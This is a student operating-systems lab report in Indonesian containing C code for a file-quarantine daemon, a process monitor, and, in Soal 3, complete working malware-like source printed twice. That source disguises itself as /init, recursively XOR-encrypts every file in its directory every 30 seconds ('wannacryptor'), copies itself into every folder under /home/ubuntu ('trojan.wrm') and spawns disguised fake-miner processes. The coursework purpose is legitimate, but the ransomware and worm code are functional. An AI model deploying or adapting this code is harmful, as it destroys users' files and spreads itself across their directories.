# LAPORAN PRAKTIKUM SISTEM OPERASI MODUL 2 KELOMPOK IT01

  |       Nama        |     NRP    |
  |-------------------|------------|
  | Ahmad Idza Anafin | 5027241017 |
  | Ivan Syarifuddin  | 5027241045 |
  | Diva Aulia Rosa   | 5027241003 |


# Soal 1


# Soal 2 
## kode untuk soal nomor 2 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <zip.h>
#include <errno.h>
#include <unistd.h>
#include <sys/wait.h>
#include <dirent.h>
#include <fcntl.h>
#include <ctype.h>
#include <signal.h>
#include <time.h>
#include <stdarg.h>

//activity logger
void log_activity(const char *format, ...) {
    FILE *log_file = fopen("activity.log", "a");
    if (!log_file) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    if (!t) {
        fclose(log_file);
        return;
    }

    char time_str[32];
    strftime(time_str, sizeof(time_str), "[%d-%m-%Y][%H:%M:%S]", t);
    fprintf(log_file, "%s - ", time_str);

    va_list args;
    va_start(args, format);
    vfprintf(log_file, format, args);
    va_end(args);

    fprintf(log_file, "\n");
    fclose(log_file);
}


// Base64 decoder
int base64_char_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

void base64_decode(const char *input, unsigned char *output) {
    int len = strlen(input);
    int val = 0, valb = -8;
    int index = 0;

    for (int i = 0; i < len; i++) {
        if (input[i] == '=' || input[i] == '\n') break;
        int c = base64_char_value(input[i]);
        if (c == -1) continue;
        val = (val << 6) + c;
        valb += 6;
        if (valb >= 0) {
            output[index++] = (val >> valb) & 0xFF;
            valb -= 8;
        }
    }
    output[index] = '\0';
}

// Returns 1 if the string is likely Base64, 0 otherwise
int is_base64(const char *str) {
    int len = strlen(str);
    if (len == 0) return 0;

    // Check for padding at the end
    if (str[len - 1] == '=') {
        if (len >= 2 && str[len - 2] == '=') {
            len -= 2;  // Handle double padding
        } else {
            len -= 1;  // Handle single padding
        }
    }

    // Check remaining characters
    for (int i = 0; i < len; i++) {
        char c = str[i];
        if (!(isalnum(c) || c == '+' || c == '/')) {
            return 0;
        }
    }
    return 1;
}

// Membuat direktori
void create_directory(const char *path) {
    if (mkdir(path, 0755) == -1 && errno != EEXIST) {
        perror("Failed to create directory");
        exit(EXIT_FAILURE);
    }
}

// Mengekstrak ZIP
void extract_zip(const char *zip_path, const char *extract_path) {
    struct zip *z;
    struct zip_file *zf;
    struct zip_stat sb;
    char buffer[8192];
    int err;

    z = zip_open(zip_path, 0, &err);
    if (!z) {
        fprintf(stderr, "Failed to open ZIP file: %s\n", zip_path);
        return;
    }

    for (zip_uint64_t i = 0; i < zip_get_num_entries(z, 0); i++) {
        if (zip_stat_index(z, i, 0, &sb) == 0) {
            printf("Extracting: %s\n", sb.name);

            zf = zip_fopen_index(z, i, 0);
            if (!zf) {
                fprintf(stderr, "Failed to open file in ZIP: %s\n", sb.name);
                continue;
            }

            char out_path[1024];
            snprintf(out_path, sizeof(out_path), "%s/%s", extract_path, sb.name);

            // Buat direktori kalau perlu
            char dir_path[1024];
            strncpy(dir_path, out_path, sizeof(dir_path));
            char *last_slash = strrchr(dir_path, '/');
            if (last_slash) {
                *last_slash = '\0';
                mkdir(dir_path, 0755);
            }

            FILE *out = fopen(out_path, "wb");
            if (!out) {
                fprintf(stderr, "Failed to create output file: %s\n", out_path);
                zip_fclose(zf);
                continue;
            }

            zip_int64_t bytes_read;
            while ((bytes_read = zip_fread(zf, buffer, sizeof(buffer))) > 0) {
                fwrite(buffer, 1, bytes_read, out);
            }

            fclose(out);
            zip_fclose(zf);
        }
    }

    zip_close(z);
    printf("Extraction complete!\n");
}

// Menghapus file
void delete_file(const char *file_path) {
    if (remove(file_path) != 0) {
        perror("Failed to delete file");
    } else {
        printf("File deleted: %s\n", file_path);
    }
}

// Daemon untuk decrypt nama file
volatile sig_atomic_t keep_running = 1;

void sigterm_handler(int signum) {
    keep_running = 0;
}

void run_decryption_daemon() {
    const char *source_dir = "starter_kit";
    const char *quarantine_dir = "quarantine";

    // Setup signal handler
    signal(SIGTERM, sigterm_handler);

    // Daemon initialization
    char cwd[1024];
    if (getcwd(cwd, sizeof(cwd)) != NULL) {
        fprintf(stderr, "Daemon starting in: %s\n", cwd);
    }


    umask(0);
    setsid();

    int dev_null = open("/dev/null", O_WRONLY);
    if (dev_null == -1) {
        perror("open /dev/null failed");
        exit(EXIT_FAILURE);
    }
    dup2(dev_null, STDIN_FILENO);
    dup2(dev_null, STDOUT_FILENO);

    // Create quarantine directory if needed
    if (mkdir(quarantine_dir, 0755) == -1 && errno != EEXIST) {
        perror("Failed to create quarantine directory");
        exit(EXIT_FAILURE);
    }

    // Loop until SIGTERM
    while (keep_running) {
        DIR *dir = opendir(source_dir);
        if (!dir) {
            perror("Failed to open source directory");
            sleep(5);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type != DT_REG) continue;

            if (!is_base64(entry->d_name)) continue;

            unsigned char decoded_name[256];
            base64_decode(entry->d_name, decoded_name);

            char src_path[1024], dest_path[1024];
            snprintf(src_path, sizeof(src_path), "%s/%s", source_dir, entry->d_name);
            snprintf(dest_path, sizeof(dest_path), "%s/%s", quarantine_dir, decoded_name);

            rename(src_path, dest_path); // Move file
        }

        closedir(dir);
        sleep(5); // Wait before next scan
    }

    fprintf(stderr, "Daemon shutting down...\n");
    close(dev_null);
    exit(EXIT_SUCCESS);
}


void move_files(const char *source_dir, const char *dest_dir, const char *mode) {
    DIR *dir = opendir(source_dir);
    if (!dir) {
        perror("Failed to open source directory");
        exit(EXIT_FAILURE);
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_REG) continue;

        char src_path[1024], dest_path[1024];
        snprintf(src_path, sizeof(src_path), "%s/%s", source_dir, entry->d_name);
        snprintf(dest_path, sizeof(dest_path), "%s/%s", dest_dir, entry->d_name);

        if (rename(src_path, dest_path) == -1) {
            perror("Failed to move file");
        } else {
            printf("Moved: %s -> %s\n", src_path, dest_path);
            if (strcmp(mode, "quarantine") == 0)
                log_activity("%s - Successfully moved to quarantine directory.", entry->d_name);
            else if (strcmp(mode, "return") == 0)
                log_activity("%s - Successfully returned to starter kit directory.", entry->d_name);
        }
    }

    closedir(dir);
}

void eradicate_files(const char *dir_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        perror("Failed to open directory");
        exit(EXIT_FAILURE);
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_REG) continue;

        char file_path[1024];
        snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);

        if (remove(file_path) == -1) {
            perror("Failed to delete file");
        } else {
            printf("Deleted: %s\n", file_path);
            log_activity("%s - Successfully deleted.", entry->d_name);
        }
    }

    closedir(dir);
}

// Fungsi untuk membaca PID dari file
pid_t read_pid(const char *pid_file_path) {
    FILE *pid_file = fopen(pid_file_path, "r");
    if (!pid_file) {
        perror("Failed to open PID file");
        return -1;
    }

    pid_t pid;
    if (fscanf(pid_file, "%d", &pid) != 1) {
        perror("Failed to read PID from file");
        fclose(pid_file);
        return -1;
    }

    fclose(pid_file);
    return pid;
}

// Fungsi untuk menulis PID ke file
void write_pid(const char *pid_file_path, pid_t pid) {
    FILE *pid_file = fopen(pid_file_path, "w");
    if (!pid_file) {
        perror("Failed to write PID file");
        exit(EXIT_FAILURE);
    }

    fprintf(pid_file, "%d\n", pid);
    fclose(pid_file);
}

// Fungsi untuk menghentikan proses berdasarkan PID
void shutdown_daemon(const char *pid_file_path) {
    pid_t pid = read_pid(pid_file_path);
    if (pid == -1) {
        fprintf(stderr, "Could not retrieve PID.\n");
        return;
    }

    if (kill(pid, SIGTERM) == -1) {
        perror("Failed to terminate daemon process");
    } else {
        printf("Daemon process with PID %d terminated.\n", pid);
        log_activity("Successfully shut off decryption process with PID %d.", pid);
    }

    // Hapus file PID
    remove(pid_file_path);
}

// Fungsi untuk memeriksa apakah direktori ada dan bisa diakses
int directory_exists(const char *path) {
    struct stat st;
    if (stat(path, &st) == -1) {
        return 0;
    }
    return S_ISDIR(st.st_mode);
}

// Fungsi untuk memeriksa apakah file ada dan bisa diakses
int file_exists(const char *path) {
    struct stat st;
    if (stat(path, &st) == -1) {
        return 0;
    }
    return S_ISREG(st.st_mode);
}

// Main
// Main dengan error handling yang lebih baik
int main(int argc, char *argv[]) {
    const char *quarantine_dir = "quarantine";
    const char *starter_kit_dir = "starter_kit";
    const char *pid_file = "starterkit.pid";

    // Validasi argumen
    if (argc > 2) {
        fprintf(stderr, "Usage: %s [--decrypt|--quarantine|--return|--eradicate|--shutdown]\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Handle opsi command line
    if (argc == 2) {
        if (strcmp(argv[1], "--decrypt") == 0) {
            // Validasi sebelum menjalankan daemon
            if (!directory_exists(starter_kit_dir)) {
                fprintf(stderr, "Error: Directory '%s' does not exist or is not accessible\n", starter_kit_dir);
                return EXIT_FAILURE;
            }

            pid_t pid = fork();
            if (pid < 0) {
                perror("fork failed");
                return EXIT_FAILURE;
            }
            if (pid > 0) {
                write_pid(pid_file, pid);
                printf("Daemon PID: %d\n", pid);
                log_activity("Successfully started decryption process with PID %d.", pid);
                return EXIT_SUCCESS;
            }

            umask(0);
            setsid();
            run_decryption_daemon();
            return 0;
        }
        else if (strcmp(argv[1], "--quarantine") == 0) {
            if (!directory_exists(starter_kit_dir)) {
                fprintf(stderr, "Error: Source directory '%s' does not exist\n", starter_kit_dir);
                return EXIT_FAILURE;
            }
            create_directory(quarantine_dir);
            move_files(starter_kit_dir, quarantine_dir, "quarantine");
            return 0;
        }
        else if (strcmp(argv[1], "--return") == 0) {
            if (!directory_exists(quarantine_dir)) {
                fprintf(stderr, "Error: Quarantine directory '%s' does not exist\n", quarantine_dir);
                return EXIT_FAILURE;
            }
            create_directory(starter_kit_dir);
            move_files(quarantine_dir, starter_kit_dir, "return");
            return 0;
        }
        else if (strcmp(argv[1], "--eradicate") == 0) {
            if (!directory_exists(quarantine_dir)) {
                fprintf(stderr, "Error: Quarantine directory '%s' does not exist\n", quarantine_dir);
                return EXIT_FAILURE;
            }
            printf("Deleting all files in quarantine directory...\n");
            eradicate_files(quarantine_dir);
            printf("Eradication complete!\n");
            return 0;
        }
        else if (strcmp(argv[1], "--shutdown") == 0) {
            if (!file_exists(pid_file)) {
                fprintf(stderr, "Error: PID file '%s' does not exist - daemon may not be running\n", pid_file);
                return EXIT_FAILURE;
            }
            printf("Shutting down daemon process...\n");
            shutdown_daemon(pid_file);
            return 0;
        }
        else {
            fprintf(stderr, "Error: Unknown option '%s'\n", argv[1]);
            fprintf(stderr, "Valid options: --decrypt, --quarantine, --return, --eradicate, --shutdown\n");
            return EXIT_FAILURE;
        }
    }

    // Download dan extract
    const char *url = "https://docs.google.com/uc?export=download&id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS";
    const char *download_path = "starterkit.zip";
    const char *extract_path = "starter_kit";

    // Periksa apakah file sudah ada
    if (file_exists(download_path)) {
        fprintf(stderr, "Error: File '%s' already exists. Please remove it before downloading again.\n", download_path);
        return EXIT_FAILURE;
    }

    printf("Downloading file from Google Drive...\n");

    pid_t pid = fork();
    if (pid == -1) {
        perror("fork failed");
        return EXIT_FAILURE;
    } else if (pid == 0) {
        char *argv[] = {
            "wget",
            "--no-check-certificate",
            (char *)url,
            "-O",
            (char *)download_path,
            NULL
        };
        execvp("wget", argv);
        perror("execvp failed");
        exit(EXIT_FAILURE);
    } else {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Download failed with status: %d\n", WEXITSTATUS(status));
            return EXIT_FAILURE;
        }
    }

    // Validasi file yang didownload
    struct stat st;
    if (stat(download_path, &st) == -1 || st.st_size == 0) {
        fprintf(stderr, "Error: Downloaded file is empty or inaccessible\n");
        return EXIT_FAILURE;
    }

    printf("Creating extraction directory...\n");
    create_directory(extract_path);

    printf("Extracting ZIP file...\n");
    extract_zip(download_path, extract_path);

    // Validasi hasil ekstraksi
    DIR *dir = opendir(extract_path);
    if (!dir) {
        perror("Failed to open extraction directory");
        return EXIT_FAILURE;
    }
    closedir(dir);

    printf("Deleting original ZIP file...\n");
    delete_file(download_path);

    printf("All tasks completed successfully!\n");
    return 0;
}

# Soal 3
  Pada soal ini terdapat 4 Objektif:
  - membuat daemon dan rename process menjadi /init
  - membuat children process pertama untuk enkripsi
  - membuat children process kedua untuk malware propagation
  - membuat children ketiga yang akan melakukan fork bomb untuk miner
  ## Full Code
      
      #include <sys/types.h>
      #include <sys/stat.h>
      #include <stdio.h>
      #include <stdlib.h>
      #include <fcntl.h>
      #include <errno.h>
      #include <unistd.h>
      #include <syslog.h>
      #include <string.h>
      #include <sys/prctl.h>
      #include <time.h>
      #include <dirent.h>
      #include <limits.h>
      #include <signal.h>
      
      extern char **environ;
      
      void daemonize() {
          //   // https://stackoverflow.com/questions/17954432/creating-a-daemon-in-linux
          pid_t pid, sid;
      
          pid = fork();
          if (pid < 0) exit(EXIT_FAILURE);
          if (pid > 0) exit(EXIT_SUCCESS);
      
          umask(0);
      
          sid = setsid();
          if (sid < 0) exit(EXIT_FAILURE);
      
          if ((chdir(".")) < 0) exit(EXIT_FAILURE);
      
          for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
              close(x);
          }
      }
      
      void menyamarkan_process(int argc, char **argv) {
          environ = NULL;
          prctl(PR_SET_NAME, "/init", 0, 0, 0);
      
          if (argc > 0) {
              size_t len = 64;
              memset(argv[0], 0, len);
              strncpy(argv[0], "/init", len);
          }
      }
      
      void xorfile(const char *filename, unsigned int key) {
          char tmp_filename[512];
          snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);
      
          FILE *in = fopen(filename, "rb");
          FILE *out = fopen(tmp_filename, "wb");
      
          if (!in || !out) {
              perror("File error");
              if (in) fclose(in);
              if (out) fclose(out);
              return;
          }
      
          int ch;
          while ((ch = fgetc(in)) != EOF) {
              fputc(ch ^ key, out);
          }
      
          fclose(in);
          fclose(out);
      
          remove(filename);
          rename(tmp_filename, filename);
      }
      
      void encrypt(const char *path, unsigned int key) {
          DIR *dir = opendir(path);
          if (!dir) return;
      
          struct dirent *entry;
          char fullpath[1024];
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
      
              struct stat st;
              if (stat(fullpath, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  encrypt(fullpath, key);
              } else if (S_ISREG(st.st_mode)) {
                  xorfile(fullpath, key);
              }
          }
          closedir(dir);
      }
      
      void copy_self_recursive(const char *dirpath) {
          DIR *dir = opendir(dirpath);
          if (!dir) return;
      
          struct dirent *entry;
          char path[PATH_MAX];
      
          char exe_path[PATH_MAX];
          ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
          if (len == -1) {
              perror("readlink");
              closedir(dir);
              return;
          }
          exe_path[len] = '\0';
      
          const char *filename = strrchr(exe_path, '/');
          filename = filename ? filename + 1 : exe_path;
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
      
              struct stat st;
              if (stat(path, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  copy_self_recursive(path);
              }
          }
      
          char target_path[PATH_MAX];
          snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);
      
          FILE *src = fopen(exe_path, "rb");
          FILE *dest = fopen(target_path, "wb");
      
          if (!src || !dest) {
              perror("copy error");
              if (src) fclose(src);
              if (dest) fclose(dest);
              closedir(dir);
              return;
          }
      
          char buffer[4096];
          size_t n;
          while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
              fwrite(buffer, 1, n, dest);
          }
      
          fclose(src);
          fclose(dest);
          closedir(dir);
      }
      
      char *generate_hash() {
          static char charset[] = "0123456789abcdef";
          static char hash[65];
          for (int i = 0; i < 64; i++) {
              hash[i] = charset[rand() % 16];
          }
          hash[64] = '\0';
          return hash;
      }
      
      void mine_worker(int id, int argc, char **argv) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
      
        char procname[64];
        snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
        prctl(PR_SET_NAME, procname, 0, 0, 0);
      
        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], procname, len);
        }
      
        srand(time(NULL) ^ (getpid() + id));  
      
        while (1) {
            int delay = (rand() % 28) + 3; 
            sleep(delay);
      
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
      
            char logline[128];
            snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                     t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                     t->tm_hour, t->tm_min, t->tm_sec,
                     id, generate_hash());
      
            FILE *log = fopen("/tmp/.miner.log", "a");
            if (log) {
                fputs(logline, log);
                fclose(log);
            }
        }
      }
      
      
      void child_1(int argc, char **argv) {
          pid_t child = fork();
          if (child < 0) exit(EXIT_FAILURE);
          if (child == 0) {
              prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
      
              if (argc > 0) {
                  size_t len = 64;
                  memset(argv[0], 0, len);
                  strncpy(argv[0], "wannacryptor", len);
              }
      
              unsigned int key = (unsigned int)time(NULL);
              while (1) {
                 encrypt(".", key);
                  sleep(30);
              }
              exit(EXIT_SUCCESS);
          }
      }
      
      void child_2(int argc, char **argv) {
          pid_t child = fork();
          if (child < 0) exit(EXIT_FAILURE);
          if (child == 0) {
              prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
      
              if (argc > 0) {
                  size_t len = 64;
                  memset(argv[0], 0, len);
                  strncpy(argv[0], "trojan.wrm", len);
              }
      
              while (1) {
                 copy_self_recursive("/home/ubuntu");
                  sleep(30);
              }
              exit(EXIT_SUCCESS);
          }
      }
      
      void child_3(int argc, char **argv) {
          pid_t rodok = fork();
          if (rodok < 0) exit(EXIT_FAILURE);
          if (rodok == 0) {
              prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
      
              if (argc > 0) {
                  size_t len = 64;
                  memset(argv[0], 0, len);
                  strncpy(argv[0], "rodok.exe", len);
              }
      
              srand(time(NULL));
              int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
              if (max_miner < 3) max_miner = 3;
      
              for (int i = 0; i < max_miner; i++) {
                  pid_t miner = fork();
                  if (miner == 0) {
                      mine_worker(i, argc, argv);
                      exit(EXIT_SUCCESS);
                  }
              }
      
              while (1) sleep(60);
              exit(EXIT_SUCCESS);
          }
      }
      
      int main(int argc, char *argv[]) {
          daemonize();
          menyamarkan_process(argc, argv);
          child_1(argc, argv);
          child_2(argc, argv);
          child_3(argc, argv);
          while (1) {
              sleep(60);
          }
          return 0;
      }

  ![image](https://github.com/user-attachments/assets/ea40dd4c-9c83-48dd-86f1-2c19f3f61093)

  #### Membuat daemon & rename process
  Pertama membuat daemon dari fungsi daemonize kemudian "menyamarkan" dengan merename thread process menjadi /init menggunakan prctl dan mengubah argv yang dikemas pada fungsi menyamarkan_process()
  
       void daemonize() {
        // https://stackoverflow.com/questions/17954432/creating-a-daemon-in-linux
        pid_t pid, sid;
    
        pid = fork();
        if (pid < 0) exit(EXIT_FAILURE);
        if (pid > 0) exit(EXIT_SUCCESS);
    
        umask(0);
    
        sid = setsid();
        if (sid < 0) exit(EXIT_FAILURE);
    
        if ((chdir(".")) < 0) exit(EXIT_FAILURE);
    
        for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
            close(x);
        }
    }

    void menyamarkan_process(int argc, char **argv) {
        environ = NULL;
        prctl(PR_SET_NAME, "/init", 0, 0, 0);
    
        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "/init", len);
        }
    }
  #### Children process wannacryptor
  disini melakukan fork untuk children proses pertama bernama wannacryptor. Dimana berfungsi untuk mengenkripsi semua file dan folder yang ada di current directory menggunakan algoritma xor dengan key timestamp. Jadi membuat fungsi xorfile() untuk melakukan enkripsi xor dan fungsi encrypt() untuk melakukan enkripsi secara rekursif ke semua file dan folder di current directory. proses ini berjalan secara terus menerus dengan interval 30 detik. fungsi tadi dispawn dengan memanggil child_1()
  
        void xorfile(const char *filename, unsigned int key) {
          char tmp_filename[512];
          snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);
      
          FILE *in = fopen(filename, "rb");
          FILE *out = fopen(tmp_filename, "wb");
      
          if (!in || !out) {
              perror("File error");
              if (in) fclose(in);
              if (out) fclose(out);
              return;
          }
      
          int ch;
          while ((ch = fgetc(in)) != EOF) {
              fputc(ch ^ key, out);
          }
      
          fclose(in);
          fclose(out);
      
          remove(filename);
          rename(tmp_filename, filename);
      }
      
      void encrypt(const char *path, unsigned int key) {
          DIR *dir = opendir(path);
          if (!dir) return;
      
          struct dirent *entry;
          char fullpath[1024];
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
      
              struct stat st;
              if (stat(fullpath, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  encrypt(fullpath, key);
              } else if (S_ISREG(st.st_mode)) {
                  xorfile(fullpath, key);
              }
          }
          closedir(dir);
      }
      void child_1(int argc, char **argv) {
        pid_t child = fork();
        if (child < 0) exit(EXIT_FAILURE);
        if (child == 0) {
            prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
    
            if (argc > 0) {
                size_t len = 64;
                memset(argv[0], 0, len);
                strncpy(argv[0], "wannacryptor", len);
            }
    
            unsigned int key = (unsigned int)time(NULL);
            while (1) {
               encrypt(".", key);
                sleep(30);
            }
            exit(EXIT_SUCCESS);
        }
    }
  #### Children Process trojan.wrm
  kemudian children kedua bernama trojan.wrm ini berfungsi sebagai malware propagation untuk menyalin dirinya sendiri ke semua home directory dari useer dengan fungsi copy_self_recursive(). Proses ini di spawn dengan memanggil child_2
  
        void copy_self_recursive(const char *dirpath) {
          DIR *dir = opendir(dirpath);
          if (!dir) return;
      
          struct dirent *entry;
          char path[PATH_MAX];
      
          char exe_path[PATH_MAX];
          ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
          if (len == -1) {
              perror("readlink");
              closedir(dir);
              return;
          }
          exe_path[len] = '\0';
      
          const char *filename = strrchr(exe_path, '/');
          filename = filename ? filename + 1 : exe_path;
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
      
              struct stat st;
              if (stat(path, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  copy_self_recursive(path);
              }
          }
      
          char target_path[PATH_MAX];
          snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);
      
          FILE *src = fopen(exe_path, "rb");
          FILE *dest = fopen(target_path, "wb");
      
          if (!src || !dest) {
              perror("copy error");
              if (src) fclose(src);
              if (dest) fclose(dest);
              closedir(dir);
              return;
          }
      
          char buffer[4096];
          size_t n;
          while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
              fwrite(buffer, 1, n, dest);
          }
      
          fclose(src);
          fclose(dest);
          closedir(dir);
      }
      void child_2(int argc, char **argv) {
        pid_t child = fork();
        if (child < 0) exit(EXIT_FAILURE);
        if (child == 0) {
            prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
    
            if (argc > 0) {
                size_t len = 64;
                memset(argv[0], 0, len);
                strncpy(argv[0], "trojan.wrm", len);
            }
    
            while (1) {
               copy_self_recursive("/home/ubuntu");
                sleep(30);
            }
            exit(EXIT_SUCCESS);
        }
    }
  
  ![image](https://github.com/user-attachments/assets/366958d7-cb54-44d8-b841-ef3e1cab7827)

  #### Children process rodok.exe
  pada children ke3 ini spawning proses yang memiliki beberapa thread sebagai children procesnya. dimana setiap thread akan generate hash secara random dan disimpan di /tmp/.miner.log. hash akan digenerate dalam interval random antara 3-30 detik. fungsi tersebut dipanggil dengan child_3 dan loop banyak thread menyesuakian.
  
        char *generate_hash() {
          static char charset[] = "0123456789abcdef";
          static char hash[65];
          for (int i = 0; i < 64; i++) {
              hash[i] = charset[rand() % 16];
          }
          hash[64] = '\0';
          return hash;
      }
      
      void mine_worker(int id, int argc, char **argv) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
      
        char procname[64];
        snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
        prctl(PR_SET_NAME, procname, 0, 0, 0);
      
        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], procname, len);
        }
      
        srand(time(NULL) ^ (getpid() + id));  
      
        while (1) {
            int delay = (rand() % 28) + 3; 
            sleep(delay);
      
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
      
            char logline[128];
            snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                     t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                     t->tm_hour, t->tm_min, t->tm_sec,
                     id, generate_hash());
      
            FILE *log = fopen("/tmp/.miner.log", "a");
            if (log) {
                fputs(logline, log);
                fclose(log);
            }
        }
      }
      void child_3(int argc, char **argv) {
        pid_t rodok = fork();
        if (rodok < 0) exit(EXIT_FAILURE);
        if (rodok == 0) {
            prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
    
            if (argc > 0) {
                size_t len = 64;
                memset(argv[0], 0, len);
                strncpy(argv[0], "rodok.exe", len);
            }
    
            srand(time(NULL));
            int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
            if (max_miner < 3) max_miner = 3;
    
            for (int i = 0; i < max_miner; i++) {
                pid_t miner = fork();
                if (miner == 0) {
                    mine_worker(i, argc, argv);
                    exit(EXIT_SUCCESS);
                }
            }
    
            while (1) sleep(60);
            exit(EXIT_SUCCESS);
        }
    }
  ![image](https://github.com/user-attachments/assets/e47698f1-25d7-4c92-bab2-3d6f63c9e522)

# Soal 4
- deklarasi library
   ```
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
  #include <dirent.h>
  #include <pwd.h>
  #include <sys/types.h>
  #include <signal.h>
  #include <time.h>
  #include <fcntl.h>
  ```
- mendefinisikan nama file yang akan digunakan untuk menyimpan log dan pid debug program 
    ```
    #define LOG_FILE "debugmon.log"
    #define PID_FILE "debugmon.pid"
    ```
- fungsi untuk mencatat ke dalam file log dengan ketentuan tanggal dan waktu
    ```
    void write_log(const char *process_name, const char *status) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(log, "[%02d:%02d:%04d]-[%02d:%02d:%02d]_%s_%s\n",
            t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
            t->tm_hour, t->tm_min, t->tm_sec,
            process_name, status);
    fclose(log);
  }
    ```
 - fungsi untuk menampilkan daftar proses user dengan fromat tabel
    ```
    void list_user_processes(const char *username) {
    DIR *proc = opendir("/proc");
    struct dirent *entry;
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        printf("User not found.\n");
        return;
    }
    uid_t target_uid = pwd->pw_uid;

      printf("------------------------------------------------------------------------------------------------\n");
    printf("| %-8s | %-20s | %-10s | %-15s |\n", "PID", "COMMAND", "CPU_USAGE", "MEMORY_USAGE");
    printf("------------------------------------------------------------------------------------------------\n");

    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            long pid = strtol(entry->d_name, NULL, 10);
            if (pid <= 0) continue;

            char status_path[256], stat_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);
            snprintf(stat_path, sizeof(stat_path), "/proc/%ld/stat", pid);

            FILE *status = fopen(status_path, "r");
            FILE *stat = fopen(stat_path, "r");
            if (!status || !stat) {
                if (status) fclose(status);
                if (stat) fclose(stat);
                continue;
            }

            char line[256], name[256] = "";
            uid_t uid = -1;
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "Name:", 5) == 0)
                    sscanf(line, "Name:\t%255s", name);
                else if (strncmp(line, "Uid:", 4) == 0)
                    sscanf(line, "Uid:\t%d", &uid);
            }
            fclose(status);

            if (uid == target_uid) {
                unsigned long utime, stime, rss;
                char stat_data[1024];
                fgets(stat_data, sizeof(stat_data), stat);
                sscanf(stat_data, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %*u %*u %lu %lu %*d %*d %*d %*d %*d %*d %*u %lu", &utime, &stime, &rss);
                fclose(stat);

                double cpu_usage = (utime + stime) / sysconf(_SC_CLK_TCK);
                double memory_usage = rss * sysconf(_SC_PAGE_SIZE) / 1024.0;

                // Cetak data dalam format kolom
                printf("| %-8ld | %-20s | %-10.2f | %-15.2f KB |\n", pid, name, cpu_usage, memory_usage);
            }
        }
    }
    closedir(proc);
    
    printf("------------------------------------------------------------------------------------------------\n");
    }

    ```
 - fungsi untuk menjalankan proses daemon
    ```
    void daemon_mode(const char *username) {
    pid_t pid = fork();
